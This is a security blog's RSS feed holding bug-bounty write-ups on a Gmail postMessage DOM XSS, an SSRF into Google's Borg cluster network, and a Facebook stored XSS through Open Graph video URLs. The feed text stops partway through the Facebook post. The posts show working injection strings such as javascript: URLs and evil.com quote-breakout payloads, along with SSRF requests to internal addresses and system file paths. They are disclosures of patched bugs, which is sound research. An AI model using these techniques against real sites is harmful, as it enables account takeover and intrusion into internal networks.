<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
	xmlns:content="http://purl.org/rss/1.0/modules/content/"
	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
	xmlns:dc="http://purl.org/dc/elements/1.1/"
	xmlns:atom="http://www.w3.org/2005/Atom"
	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
	
	xmlns:georss="http://www.georss.org/georss"
	xmlns:geo="http://www.w3.org/2003/01/geo/wgs84_pos#"
	>

<channel>
	<title>OpnSec</title>
	<atom:link href="/feed/" rel="self" type="application/rss+xml" />
	<link></link>
	<description>Open mind Security and Crypto!</description>
	<lastBuildDate>Fri, 30 Jul 2021 20:07:09 +0000</lastBuildDate>
	<language>en-US</language>
	<sy:updatePeriod>
	hourly	</sy:updatePeriod>
	<sy:updateFrequency>
	1	</sy:updateFrequency>
	<generator>https://wordpress.org/?v=6.0.11</generator>

<image>
	<url>/wp-content/uploads/2017/08/cropped-opnsec-32x32.png</url>
	<title>OpnSec</title>
	<link></link>
	<width>32</width>
	<height>32</height>
</image> 
<site xmlns="com-wordpress:feed-additions:1">250189475</site>	<item>
		<title>DOM XSS in Gmail with a little help from Chrome</title>
		<link>/2020/05/dom-xss-in-gmail-with-a-little-help-from-chrome/?utm_source=rss&#038;utm_medium=rss&#038;utm_campaign=dom-xss-in-gmail-with-a-little-help-from-chrome</link>
					<comments>/2020/05/dom-xss-in-gmail-with-a-little-help-from-chrome/#comments</comments>
		
		<dc:creator><![CDATA[Engue Gillier]]></dc:creator>
		<pubDate>Sun, 03 May 2020 06:04:09 +0000</pubDate>
				<category><![CDATA[Google]]></category>
		<guid isPermaLink="false">/?p=382</guid>

					<description><![CDATA[How to use browser features to help find DOM XSS. The invisible Messages of Gmail Last year, I looked for DOM XSS in Gmail website. Instead of using url params or the emails themselves as the source of the attack, I decided to use the much more discreet yet ubiquitous postMessage api.Â  At first glance,&#8230; <a class="read-more" href="/2020/05/dom-xss-in-gmail-with-a-little-help-from-chrome/">Read More</a>]]></description>
										<content:encoded><![CDATA[<p>How to use browser features to help find DOM XSS.</p>
<h3>The invisible Messages of Gmail</h3>
<p>Last year, I looked for DOM XSS in Gmail website. Instead of using url params or the emails themselves as the source of the attack, I decided to use the much more discreet yet ubiquitous <a href="https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage" target="_blank" rel="noopener noreferrer">postMessage</a> api.Â  At first glance, the Gmail inbox seems a simple webpage, but if you go through the looking glass, it&#8217;s actually a dozen of different webpages (or iframes) communicating between each others.</p>
<p><img loading="lazy" class="alignnone size-large wp-image-384" src="/wp-content/uploads/2020/05/iframes-1024x547.png" alt="" width="1024" height="547" srcset="/wp-content/uploads/2020/05/iframes-1024x547.png 1024w, /wp-content/uploads/2020/05/iframes-300x160.png 300w, /wp-content/uploads/2020/05/iframes-768x410.png 768w, /wp-content/uploads/2020/05/iframes-1536x821.png 1536w, /wp-content/uploads/2020/05/iframes.png 1920w" sizes="(max-width: 1024px) 100vw, 1024px" /></p>
<p>My first task was to make the cross-frames messages visible. This is not a native feature in DevTools yet. Instead, you can use this simple <a href="https://github.com/opnsec/postMessage-logger" target="_blank" rel="noopener noreferrer">postMessage logger extension</a>. After reloading, the console is now overwhelmed with frame to frame messages going back and forth.</p>
<p><img loading="lazy" class="alignnone size-large wp-image-385" src="/wp-content/uploads/2020/05/postmessage-1024x547.png" alt="" width="1024" height="547" srcset="/wp-content/uploads/2020/05/postmessage-1024x547.png 1024w, /wp-content/uploads/2020/05/postmessage-300x160.png 300w, /wp-content/uploads/2020/05/postmessage-768x410.png 768w, /wp-content/uploads/2020/05/postmessage-1536x821.png 1536w, /wp-content/uploads/2020/05/postmessage.png 1600w" sizes="(max-width: 1024px) 100vw, 1024px" /></p>
<blockquote><p>Each message has a <strong>target</strong> (the frame which receives the message), a <strong>source</strong> (the frame which sent the message), an <strong>origin</strong> (the domain of the source) and the <strong>data</strong>, which can be a string or a JSON object (or any kind of object that <a href="https://developer.mozilla.org/en-US/docs/Web/API/Web_Workers_API/Structured_clone_algorithm">will be cloned</a> in the process). Messages can be sent by any frame to another, even from different domain and even from different tab if the source has a reference to the target, with window.opener, window.open() and window.frames.</p></blockquote>
<p>The target receives the message using <pre><code ><span class="pl-en">addEventListener</span><span class="pl-kos">(</span><span class="pl-s">"message", function(message){/* handle message here */})</code></pre> like in the extension.</span></p>
<p>If there are too many messages, you can customize the extension to filter messages by any of their property. I was looking for interesting messages and one message in particular contained an url in the data:</p>
<p><img loading="lazy" class="alignnone size-large wp-image-387" src="/wp-content/uploads/2020/05/frame-1024x340.png" alt="" width="1024" height="340" srcset="/wp-content/uploads/2020/05/frame-1024x340.png 1024w, /wp-content/uploads/2020/05/frame-300x100.png 300w, /wp-content/uploads/2020/05/frame-768x255.png 768w, /wp-content/uploads/2020/05/frame.png 1182w" sizes="(max-width: 1024px) 100vw, 1024px" /></p>
<p>This message is sent by &#8220;hangouts.google.com&#8221; to &#8220;mail.google.com&#8221; . Not only is there a url in the message data, but the url contains the word &#8220;frame&#8221;. interesting&#8230;</p>
<h3>The browser Toolbox</h3>
<p>I went to the network tab of DevTools and filtered the requests by type &#8220;doc&#8221; which means &#8220;top window url and iframes src&#8221;. The same url was there:</p>
<p><img loading="lazy" class="alignnone size-large wp-image-389" src="/wp-content/uploads/2020/05/network-1024x480.png" alt="" width="1024" height="480" srcset="/wp-content/uploads/2020/05/network-1024x480.png 1024w, /wp-content/uploads/2020/05/network-300x141.png 300w, /wp-content/uploads/2020/05/network-768x360.png 768w, /wp-content/uploads/2020/05/network.png 1155w" sizes="(max-width: 1024px) 100vw, 1024px" /></p>
<p>I could also confirm that the request referrer was &#8220;mail.google.com&#8221; which was a good sign since it&#8217;s the domain that received the Message. The value in red circle is the initiator of the request, the JS code that loaded the iframe. You can click on it and it brings you directly to the corresponding code in the source tab. Unminify the code, set a breakpoint, reload and the breakpoint is hit:</p>
<p><img loading="lazy" class="alignnone size-large wp-image-390" src="/wp-content/uploads/2020/05/debug-1024x441.png" alt="" width="1024" height="441" srcset="/wp-content/uploads/2020/05/debug-1024x441.png 1024w, /wp-content/uploads/2020/05/debug-300x129.png 300w, /wp-content/uploads/2020/05/debug-768x331.png 768w, /wp-content/uploads/2020/05/debug.png 1533w" sizes="(max-width: 1024px) 100vw, 1024px" /></p>
<p>And voila! The function that triggers the request is appendChild(). This is pretty much all we can understand from the code which is unreadable. But with the magic of the debugger we can confirm that the argument contains an iframe with the src set to the url. If you click on the functions in the Call Stack on the right, you can navigate through the &#8220;control flow&#8221; of the program and understand its logic.</p>
<p>For example, here is how the message is received by the frame:</p>
<p><img loading="lazy" class="alignnone size-full wp-image-391" src="/wp-content/uploads/2020/05/listener.png" alt="" width="766" height="217" srcset="/wp-content/uploads/2020/05/listener.png 766w, /wp-content/uploads/2020/05/listener-300x85.png 300w" sizes="(max-width: 766px) 100vw, 766px" /></p>
<p>You can even see the code where the source of the message sent it:</p>
<p><img loading="lazy" class="alignnone size-full wp-image-392" src="/wp-content/uploads/2020/05/post.png" alt="" width="1013" height="319" srcset="/wp-content/uploads/2020/05/post.png 1013w, /wp-content/uploads/2020/05/post-300x94.png 300w, /wp-content/uploads/2020/05/post-768x242.png 768w" sizes="(max-width: 1013px) 100vw, 1013px" /></p>
<blockquote><p>There are dozens of functions between the listener and the loading of the url, across multiple files and thousands of lines of code. It is not uncommon that the browser freezes, breaks or skips breakpoint when you debug such heavy webpages, it&#8217;s a matter of trial and error! <img src="https://s.w.org/images/core/emoji/14.0.0/72x72/1f609.png" alt="ðŸ˜‰" class="wp-smiley" style="height: 1em; max-height: 1em;" /></p></blockquote>
<p>I tried to send a message to the frame from the console with the same data but with &#8220;javascript:alert(1)&#8221; instead of the url. I didn&#8217;t got an alertbox, but a CSP error message.</p>
<p><img loading="lazy" class="alignnone size-large wp-image-393" src="/wp-content/uploads/2020/05/csp-1024x52.png" alt="" width="1024" height="52" srcset="/wp-content/uploads/2020/05/csp-1024x52.png 1024w, /wp-content/uploads/2020/05/csp-300x15.png 300w, /wp-content/uploads/2020/05/csp-768x39.png 768w, /wp-content/uploads/2020/05/csp-1536x79.png 1536w, /wp-content/uploads/2020/05/csp.png 1779w" sizes="(max-width: 1024px) 100vw, 1024px" /></p>
<p>Thankfully, this CSP rule wasn&#8217;t enforced by IE11 and Edge (at the time) so I was able to trigger the alertbox on those browsers. There was no check on the origin of the message. A simple attack scenario is to start from the attacker webpage, open a new tab to Gmail and inject the payload in the Gmail tab using postMessage. The Gmail tab loads the javascript iframe and the attacker has arbitrary code execution on the victim&#8217;s Gmail page, which means it can read and send emails, change password of accounts registered to this email etc&#8230;</p>
<h3>The random Channel Name</h3>
<p>There was still one issue: with so much communication between so many frames, it is easy to get confused, so messages usually have a channel name. The name is a random 6 char generated by &#8220;mail.google.com&#8221; and transmitted in the first message to &#8220;hangouts.google.com&#8221;. In all following messages that it receives, &#8220;hangouts.google.com&#8221; checks if it contains the correct channel name, and if not it doesn&#8217;t process the message.</p>
<p>The attacker doesn&#8217;t know the channel name, and 6 alphanumeric is too much possibilities to try all.<br />
The random generator is &#8220;Math.random()&#8221; which is not secure and <a href="http://ifsec.blogspot.com/2012/09/of-html5-security-cross-domain.html" target="_blank" rel="noopener noreferrer">has been exploited</a> in the past by a Google engineer to find an XSS in Facebook! <img src="https://s.w.org/images/core/emoji/14.0.0/72x72/1f642.png" alt="ðŸ™‚" class="wp-smiley" style="height: 1em; max-height: 1em;" /> However the technique required the state of the random generator to be shared between cross-domain tabs which is not the case anymore.<br />
The third solution is to load an iframe controlled by the attacker in the hierarchy of frames in the Gmail tab. Because of the way cross-domain redirection of iframes works in the browser, the fact that Gmail X-Frame-Options header is &#8220;SAMEORIGIN&#8221; and that the messages were sent with the argument targetOrigin &#8220;*&#8221;, it would then be possible to intercept the channel name and execute the XSS.</p>
<h3>Conclusion</h3>
<p>I couldn&#8217;t find an easy way to load an iframe inside Gmail, but with all this I was confident enough to send a report to Google VRP and after a few days I received the &#8220;Nice Catch&#8221; answer and reward. Google fixed it by adding check on the origin of the message containing the url. The XSS doesn&#8217;t work anymore, but the message is still sent if you want to check.</p>
<p>Browsers have all the cool features to navigate complex code, and for the features that are still missing, you can build you own extensions easily. With that, good hunting! <img src="https://s.w.org/images/core/emoji/14.0.0/72x72/1f642.png" alt="ðŸ™‚" class="wp-smiley" style="height: 1em; max-height: 1em;" /></p>
<p>&nbsp;</p>

<div class="twitter-share"><a href="https://twitter.com/intent/tweet?url=https%3A%2F%2Fopnsec.com%2F2020%2F05%2Fdom-xss-in-gmail-with-a-little-help-from-chrome%2F&#038;via=opnsec" class="twitter-share-button">Tweet</a></div>
]]></content:encoded>
					
					<wfw:commentRss>/2020/05/dom-xss-in-gmail-with-a-little-help-from-chrome/feed/</wfw:commentRss>
			<slash:comments>8</slash:comments>
		
		
		<post-id xmlns="com-wordpress:feed-additions:1">382</post-id>	</item>
		<item>
		<title>Into the Borg &#8211; SSRF inside Google production network</title>
		<link>/2018/07/into-the-borg-ssrf-inside-google-production-network/?utm_source=rss&#038;utm_medium=rss&#038;utm_campaign=into-the-borg-ssrf-inside-google-production-network</link>
					<comments>/2018/07/into-the-borg-ssrf-inside-google-production-network/#comments</comments>
		
		<dc:creator><![CDATA[Engue Gillier]]></dc:creator>
		<pubDate>Fri, 20 Jul 2018 14:51:40 +0000</pubDate>
				<category><![CDATA[Google]]></category>
		<category><![CDATA[Borg]]></category>
		<category><![CDATA[Kubernetes]]></category>
		<category><![CDATA[SSRF]]></category>
		<guid isPermaLink="false">/?p=317</guid>

					<description><![CDATA[Intro &#8211; Testing Google Sites and Google Caja In March 2018, I reported an XSS in Google Caja, a tool to securely embed arbitrary html/javascript in a webpage. In May 2018, after the XSS was fixed, I realised that Google Sites was using an unpatched version of Google Caja, so I looked if it was&#8230; <a class="read-more" href="/2018/07/into-the-borg-ssrf-inside-google-production-network/">Read More</a>]]></description>
										<content:encoded><![CDATA[<h3><img loading="lazy" class=" wp-image-327 aligncenter" src="/wp-content/uploads/2018/07/borg2-1024x498.png" alt="Borglet status monitor" width="864" height="420" srcset="/wp-content/uploads/2018/07/borg2-1024x498.png 1024w, /wp-content/uploads/2018/07/borg2-300x146.png 300w, /wp-content/uploads/2018/07/borg2-768x374.png 768w, /wp-content/uploads/2018/07/borg2.png 1864w" sizes="(max-width: 864px) 100vw, 864px" /></h3>
<h3></h3>
<h3>Intro &#8211; Testing Google Sites and Google Caja</h3>
<p>In March 2018, I reported an XSS in <a href="https://developers.google.com/caja/" target="_blank" rel="noopener noreferrer">Google Caja</a>, a tool to securely embed arbitrary html/javascript in a webpage.<br />
In May 2018, after the XSS was fixed, I realised that Google Sites was using an unpatched version of Google Caja, so I looked if it was vulnerable to the XSS. However, the XSS wasn&#8217;t exploitable there.</p>
<p>Google Caja parses html/javascript and modifies it to remove any javascript sensitive content, such as iframe or object tags and javascript sensitive properties such as document.cookie. Caja mostly parses and sanitizes HTML tags on the client side. However, for remote javascript tag (&lt;script src=&#8221;xxx&#8221;&gt;), the remote resource was fetched, parsed and sanitized on the server-side.<br />
I tried to host a javascript file on my server (https://[attacker].com/script.js) and check if the Google Sites server would fall for the XSS when parsed server-side but the server replied that https://[attacker].com/script.js was not accessible.</p>
<p>After a few tests, I realised that the Google Sites Caja server would only fetch Google-owned resources like https://www.google.com or https://www.gstatic.com, but not any external resource like https://www.facebook.com.<br />
That&#8217;s a strange behavior because this functionality is meant to fetch external resources so it looks like a broken feature. More interestingly, it is hard to determine whether an arbitrary URL belongs to Google or not, given the breadth of Google services. Unless&#8230;</p>
<p>&nbsp;</p>
<h3>Finding an SSRF in Google</h3>
<p>Whenever I find an endpoint that fetches arbitrary content server-side, I always test for SSRF. I did it a hundred times on Google services but never had any luck. Anyway the only explanation for the weird behavior of the Google Caja server was that the fetching was happening on the internal Google network and that is why it could only fetch Google-owned resources but not external resources. I already knew this was a bug, now the question was whether it was a security bug!</p>
<p>It&#8217;s very easy to host and run arbitrary code on Google servers, use Google Cloud services! I created a <a href="https://cloud.google.com/appengine/" target="_blank" rel="noopener noreferrer">Google App Engine</a> instance and hosted a javascript file. I then used the URL of this javascript file on Google Sites as a external script resource and updated the Google Sites page. The javascript was successfully fetched and parsed by Google Caja server. I then checked my Google App Engine instance logs to see from where the resource was fetched and it came from 10.x.x.201, a private network IP! This looked very promising.</p>
<p>I used the private IP as the url for the Google Sites javascript external resource and waited for the moment of truth. The request took more than 30 seconds to complete and at that time I really thought the request was blocked and I almost closed the page since I never had any luck with SSRF on Google before. However, when Google Caja replied, I saw that the reply size wasn&#8217;t around 1 KB like for a typical error message but 1 MB instead! One million bytes of information coming from a 10.x.x.x IP from Google internal network, I can tell you I was excited at this point! <img src="https://s.w.org/images/core/emoji/14.0.0/72x72/1f642.png" alt="ðŸ™‚" class="wp-smiley" style="height: 1em; max-height: 1em;" /><br />
I opened the file and indeed it was full of private information from Google! \o/</p>
<p>&nbsp;</p>
<h3>Google, from the inside</h3>
<p>First I want to say that I didn&#8217;t scan Google&#8217;s internal network. I only made 3 requests in the network to confirm the vulnerability and immediately sent a report to Google VRP. It took 48 hours to Google to fix the issue (I reported it on a Saturday), so in the meantime I couldn&#8217;t help but test 2-3 more requests to try to pivot the SSRF vulnerability into unrestricted file access or RCE but without luck.</p>
<p><img loading="lazy" class="aligncenter wp-image-326 size-full" src="/wp-content/uploads/2018/07/borg-1.png" alt="Architecture of Borg" width="490" height="431" srcset="/wp-content/uploads/2018/07/borg-1.png 490w, /wp-content/uploads/2018/07/borg-1-300x264.png 300w" sizes="(max-width: 490px) 100vw, 490px" /></p>
<p>The first request was to http://10.x.x.201/. It responded with a server status monitoring page of a &#8220;Borglet&#8221;. After a Google search, I could confirm that I was indeed inside <a href="https://storage.googleapis.com/pub-tools-public-publication-data/pdf/43438.pdf" target="_blank" rel="noopener noreferrer"><strong>Borg, Google&#8217;s internal large-scale cluster management system</strong></a>Â (<a href="https://www.infoq.com/news/2015/04/google-borg" target="_blank" rel="noopener noreferrer">here</a> is a overview of the architecture). Google have open sourced the <a href="https://kubernetes.io/blog/2015/04/borg-predecessor-to-kubernetes/" target="_blank" rel="noopener noreferrer">successor of Borg, Kubernetes</a> in 2014. It seems that while Kubernetes is getting more and more popular, Google is still relying on Borg for its internal production infrastructure, but I can tell you it&#8217;s not because of the design of Borg interfaces! (edit: this is intended as a jokeÂ <img src="https://s.w.org/images/core/emoji/14.0.0/72x72/1f61b.png" alt="ðŸ˜›" class="wp-smiley" style="height: 1em; max-height: 1em;" /> )<br />
The second request was to http://10.x.x.1/ and it was also a monitoring page for another Borglet. The third request was http://10.x.x.1/getstatus, a different status monitoring page of a Borglet with more details on the jobs like permissions, arguments.</p>
<p>Each Borglet represents a machine, a server.</p>
<p>On the hardware side, both servers were using Haswell&#8217;s CPU @2.30GHz with 72 cores, which corresponds to a set of 2 or 3 Xeon E5 v3. Both servers were using the CPUs at 77%. They had 250GB of RAM, which was used at 70%. They had 1 HDD each with 2TB and no SSD. The HDD were almost empty with only 15GB used, so the data is stored elsewhere.</p>
<p>The processing jobs (alloc and tasks) are very diverse, I believe this optimizes ressource usage with some jobs using memory, others using CPU, network, some with high priority, etc&#8230; Some services seem very active : Video encoding, Gmail and Ads. That should not be surprising since video processing is very heavy, Gmail is one of the main Google services and Ads is, well, Google&#8217;s core business. <img src="https://s.w.org/images/core/emoji/14.0.0/72x72/1f609.png" alt="ðŸ˜‰" class="wp-smiley" style="height: 1em; max-height: 1em;" /><br />
I didn&#8217;t see Google Sites or Caja in the jobs list, so either the SSRF was going through a proxy or the Borglet on 10.x.x.201 was from a different network than theÂ 10.x.x.201 IP I saw in my Google App Engine instance logs.</p>
<p>Regarding the architecture, we can find jobs related to almost all of the components of the <a href="http://malteschwarzkopf.de/research/assets/google-stack.pdf" target="_blank" rel="noopener noreferrer">Google Stack</a>, in particular MapReduce, BitTable, Flume, GFS&#8230;<br />
On the technology side, Java seems to be heavily used. I didn&#8217;t see any mention of Python, C++, NodeJS or Go, but that doesn&#8217;t mean it wasn&#8217;t used so don&#8217;t draw conclusions. <img src="https://s.w.org/images/core/emoji/14.0.0/72x72/1f61b.png" alt="ðŸ˜›" class="wp-smiley" style="height: 1em; max-height: 1em;" /><br />
I should mention that Borg, like Kubernetes, relies on containers like Docker, and VMs. For video processing, it seems they are using <a href="https://github.com/google/gvisor" target="_blank" rel="noopener noreferrer">Gvisor</a>, a Google open-source tool that looks like a trade-off between containers performance and VMs security.</p>
<p>Parameters gives some information on how to reach the applications through network ports. On Borg, it seems that all applications on a server share the same IP address and each has some dedicated ports.</p>
<p>Apps arguments were the most fun part for me because it is almost code. I didn&#8217;t find Google Search secret algorithm but there was some cool queries like this:<pre><code >MSCR(M(Customer.AdGroupCriterion+Customer.AdGroupCriterion-marshal+FilterDurianAdGroupCriterion+FilterNeedReviewAdGroupCriterion+GroupAdGroupCriterionByAdGroupKey+JoinAdGroupData/MakeUnionTable:3)+M(JoinAdGroupData/MakeUnionTable:2)+M(Customer.AdGroup+Customer.AdGroup-marshal+FilterDurianAdGroup+ParDo(AdGroupDataStripFieldsFn)+JoinAdGroupData/MakeUnionTable)+R(JoinAdGroupData/GroupUnionTables+JoinAdGroupData/ConstructJoinResults+JoinAdGroupData/ExtractTuples+ExtractCreativeAndKeywordReviewables))</code></pre></p>
<p>If you wonder what&#8217;s Gmail system user, it&#8217;s <pre><code >gmail@prod.google.com</code></pre>There is also a user &#8220;legal-discovery@prod.google.com&#8221; that has permission &#8220;auth.impersonation.impersonateNormalUser&#8221; on &#8220;mdb:all-person-users&#8221;. (edit: for clarification, I just saw these strings close to each other in a big array and assumed that&#8217;s what it meant)</p>
<p>There was also a little bit of history which showed that most jobs where aborted before finishing.</p>
<p>At last, there was a lot of url to other servers or applications endpoints. In particular, I tried to access a promising-looking http://wiki/ url but it didn&#8217;t work. I tested a <pre><code >/getFile?FileName=/sys/borglet/borglet.INFO</code></pre> url but got an unauthorized response. I also tried to change the FileName parameter but got error messages.</p>
<p>&nbsp;</p>
<h3>Google VRP response</h3>
<p>I reported the issue on Saturday May 12, 2018, and it was automatically triaged as a P3 (medium priority) issue. On Sunday I sent an email to Google Security that they might want someone to have a look at this. On Monday morning the issue was escalated to P0 (critical) then later decreased to P1. On Monday night the vulnerable endpoint was removed and the issue fixed.</p>
<p>It&#8217;s not easy to determine the impact of an SSRF because it really depends on what&#8217;s in the internal network. Google tends to keep most of its infrastructure available internally and uses a lot of web endpoints, which means that in case of a SSRF, an attacker could potentially access hundreds if not thousands of internal web applications. On the other hand, Google heavily relies on authentication to access resources which limits the impact of a SSRF.<br />
In this case, the Borglet status monitoring page wasn&#8217;t authenticated, and it leaked a lot of information about the infrastructure. My understanding is that in Kubernetes, this page is authenticated.</p>
<p>Google VRP rewarded me with $13,337, which corresponds to something like unrestricted file access! They explained that while most internal resources would require authentication, they have seen in the past dev or debug handlers giving access to more than just info leaks, so they decided to reward for the maximum potential impact. I&#8217;d like to thank them for the bounty and for their quick response.</p>
<p>&nbsp;</p>
<p>That&#8217;s it for this story, I hope you enjoyed it as much I did and feel free to comment!</p>

<div class="twitter-share"><a href="https://twitter.com/intent/tweet?url=https%3A%2F%2Fopnsec.com%2F2018%2F07%2Finto-the-borg-ssrf-inside-google-production-network%2F&#038;via=opnsec" class="twitter-share-button">Tweet</a></div>
]]></content:encoded>
					
					<wfw:commentRss>/2018/07/into-the-borg-ssrf-inside-google-production-network/feed/</wfw:commentRss>
			<slash:comments>7</slash:comments>
		
		
		<post-id xmlns="com-wordpress:feed-additions:1">317</post-id>	</item>
		<item>
		<title>Stored XSS on Facebook</title>
		<link>/2018/03/stored-xss-on-facebook/?utm_source=rss&#038;utm_medium=rss&#038;utm_campaign=stored-xss-on-facebook</link>
					<comments>/2018/03/stored-xss-on-facebook/#comments</comments>
		
		<dc:creator><![CDATA[Engue Gillier]]></dc:creator>
		<pubDate>Sun, 18 Mar 2018 15:41:18 +0000</pubDate>
				<category><![CDATA[Uncategorized]]></category>
		<category><![CDATA[Facebook]]></category>
		<category><![CDATA[XSS]]></category>
		<guid isPermaLink="false">/?p=242</guid>

					<description><![CDATA[tl;dr; Stored XSSes in Facebook wall by embedding an external video with Open Graph. When a user clicks to play the video, the XSS executes on facebook.com Introduction I reported multiple stored XSS on Facebook wall in April 2017.Â These stored XSS vulnerabilities were also present in WordPress soÂ I waited for WordPress to patch it before&#8230; <a class="read-more" href="/2018/03/stored-xss-on-facebook/">Read More</a>]]></description>
										<content:encoded><![CDATA[<blockquote><p>tl;dr; Stored XSSes in Facebook wall by embedding an external video with Open Graph.</p>
<p>When a user clicks to play the video, the XSS executes on facebook.com</p></blockquote>
<h3>Introduction</h3>
<p>I reported multiple stored XSS on Facebook wall in April 2017.Â These stored XSS vulnerabilities were also present in WordPress soÂ I waited for WordPress to patch it before publishing this write-up. The vulnerabilities are now fixed on WordPress!</p>
<p>These XSS are a little bit complex because they require multiple steps, but each step by itself is pretty simple to understand.</p>
<p>&nbsp;</p>
<h3>The Open Graph protocol</h3>
<p>When you add a URL in a Facebook post, Facebook will use the <a href="http://ogp.me/">Open Graph protocol</a>Â (<a href="https://developers.facebook.com/docs/sharing/webmasters/" target="_blank" rel="noopener noreferrer">FB doc</a>) to display rich content. Â Here is a summary about how Facebook uses OG to embed external content in a FB post:</p>
<p>&nbsp;</p>
<ol>
<li>The attacker posts a URL on a FB post</li>
<li>FB server fetches the URL (server side) and reads the OG meta tags to extract info about the content of the URL (for example the content is a video with a title, a cover image, a video encoding type and a video file URL)</li>
<li>The victim views the FB post with the cover image and a play button</li>
<li>When the victim clicks on the play button, the video loads using the video info extracted from the OG meta tags. This is when the XSS will be executed</li>
</ol>
<p>&nbsp;</p>
<blockquote><p>This OG workflow is also used by many websites including Twitter and WordPress for example.<br />
Step #2 is sensitive: server-side fetching of a user provided URL, which can often lead to SSRF.<br />
Another potential vulnerability is Clickjacking if the hosting website uses X-Frame-Options: SAMEORIGIN on sensitive webpages and let the attacker inject arbitrary iframes on the same subdomain.</p>
<p>FB wasn&#8217;t vulnerable to either of these issues.</p></blockquote>
<p>The interesting part is #4 when FB loads the video after the victim clicks the play button. First, FB will send a XHR request to get the video type and the video file URL, which are both provided by the attacker in theÂ og:video:type (we&#8217;ll call it ogVideoType) and theÂ og:video:secure_url (ogVideoUrl) tags of the URL posted by the attacker. Here is a sample of OG meta tags:</p>
<pre><code ></p>
<p>&lt;!DOCTYPE html&gt;</p>
<p>&lt;html&gt;</p>
<p>&lt;head&gt;</p>
<p>&lt;meta property="og:video:type" content="video/flv"&gt;</p>
<p>&lt;meta property="og:video:secure_url" content='https://example.com/video.flv'&gt;</p>
<p>&lt;meta property="og:video:width" content="718"&gt;</p>
<p>&lt;meta property="og:video:height" content="404"&gt;</p>
<p>&lt;meta property="og:image" content="https://example.com/cover.jpg"&gt;</p>
<p>(...)</p>
<p>&lt;/head&gt;</p>
<p>&lt;body&gt;</p>
<p>(...)<br />
&lt;/body&gt;</p>
<p>&lt;/html&gt;</p>
<p></code></pre>
<p>IfÂ ogVideoType is &#8220;iframe&#8221; or &#8220;swf player&#8221; then FB loads an external iframe and doesn&#8217;t handle the playing of the video. Otherwise, FB was using <a href="http://www.mediaelementjs.com/">MediaElement.js</a> to handle the loading of the video directly on facebook.com. I already reported and <a href="/2017/10/flashme-wordpress-vulnerability-disclosure-cve-2016-9263/">disclosed vulnerabilities</a>Â on the Flash component of ME.js on both Facebook and WordPress.</p>
<p>&nbsp;</p>
<h2>1. Stored XSS using FlashMediaElement.swf</h2>
<p>MediaElements.js has multiple ways of playing a video depending on ogVideoType.</p>
<p>If ogVideoType is &#8220;video/flv&#8221; (flash video), Facebook loads the Flash file FlashMediaElement.swf on facebook.comÂ  (using an &lt;embed&gt; tag) and passes the ogVideoUrl to FlashME.swf to play the video. FlashME.swf then sends logs information to facebook.com (using Flash-to-javascript) about events like &#8220;video played&#8221; or &#8220;video ended&#8221;.Â FlashME.swf handled correctly the Flash-to-javascript communication, in particular <strong>\</strong> was properly escaped to <strong>\\</strong> to avoid XSS.</p>
<p>However, the javascript code sent was :</p>
<pre><code >setTimeout('log("[VIDEO_URL]")', 0)</code></pre>
<blockquote><p>In javascript setTimeout is similar to eval, it will transform a string into instructions, making it very dangerous</p></blockquote>
<p>[VIDEO_URL] is controlled by the attacker, it&#8217;s the value of ogVideoUrl. If it contains <strong>&#8220;</strong> for example <pre><code >http://evil.com/video.flv?"[payload]</code></pre> Flash will send the following instruction to javascript:</p>
<pre><code >setTimeout("log(\"http://evil.com/video.flv?\"payload\")", 0);</code></pre>
<p>As you can see, the <strong>&#8220;</strong> in <strong>video.flv?\&#8221;payload</strong> is properly escaped so the attacker cannot escape from the setTimeout function.</p>
<p>However, when javascript executes the setTimeout function, it will execute the following javascript instruction :</p>
<pre><code >log("http://evil.com/video.flv?"[payload]")</code></pre>
<p>And this time <strong>&#8220;</strong> is not escaped any more and the attacker can inject XSS!</p>
<p>Now the question is whether Facebook escapes ogVideoUrl before passing it to FlashME.swf.</p>
<p>First, Facebook javascript sends a XHR request to Facebook server to get the value of ogVideoType and ogVideoUrl. The value ofÂ ogVideoUrl is correctly encoded but it can contain any special character like <pre><code >https://evil.com?"'&lt;\</code></pre></p>
<p>Then, before being sent to Flash, ogVideoUrl was transformed like this :</p>
<pre><code >function absolutizeUrl(<span class="objectBox objectBox-text " role="presentation">ogVideoUrl</span>) {<br />
var tempDiv = document.createElement('div');<br />
tempDiv.innerHTML = '&lt;a href="' + <span class="objectBox objectBox-text " role="presentation">ogVideoUrl</span>.toString().split('"').join('&amp;quot;') + '"&gt;x&lt;/a&gt;';<br />
return tempDiv.firstChild.href;<br />
}</p>
<p>flashDiv.innerHTML ='&lt;embed src="FlashME.swf?videoFile=' +Â <span class="objectBox objectBox-text " role="presentation">encodeURI(absolutizeUrl(ogVideoUrl )) +'</span>" type="application/x-shockwave-flash"&gt;';</p>
<p></code></pre>
<p>The result ofÂ <span class="objectBox objectBox-text " role="presentation">absolutizeUrl(ogVideoUrl) is URL encoded before being sent to Flash but when Flash will receive the data it will automatically URL decode it once, so we can ignore theÂ encodeURI instruction.</span></p>
<p><span class="objectBox objectBox-text " role="presentation">absolutizeUrl t</span>ransforms relative URL to absolute URL with the current protocol and domain of the javascript context (and if anÂ absolute URL is provided, it returns it almost unchanged). This seems &#8220;hacky&#8221; but it seems secure enough and simple because we let the browser do the hard work. But it&#8217;s not simple when it comes to special character encoding!</p>
<p>When initially analyzing this code, I was using Firefox, because it had great extensions like Hackbar, Tamper Data and&#8230; Firebug!</p>
<p>In Firefox, if you tryÂ <pre><code >absolutizeUrl('http://evil.com/video.flv#"payload')</code></pre> it will returnÂ <pre><code >http://evil.com/video.flv#%22payload</code></pre> so I was stuck because in Facebook the javascript instruction sent by Flash would beÂ <pre><code >setTimeout("log(\"http://evil.com/video.flv?%22payload\")", 0);</code></pre> which will lead toÂ <pre><code >log("http://evil.com/video.flv?%22[payload]")</code></pre> which is NOT an XSS.</p>
<p>&nbsp;</p>
<p>And then I tried on Chrome and <pre><code >absolutizeUrl('http://evil.com/video.flv#"payload')</code></pre> returnedÂ <pre><code >http://evil.com/video.flv#"payload</code></pre> and <strong>\o/ YEAH!!!!!</strong></p>
<p>Now Flash sends <pre><code >setTimeout("log(\"http://evil.com/video.flv?\"payload\")", 0);</code></pre> to Facebook javascript and which will lead toÂ <pre><code >log("http://evil.com/video.flv?"[payload]")</code></pre></p>
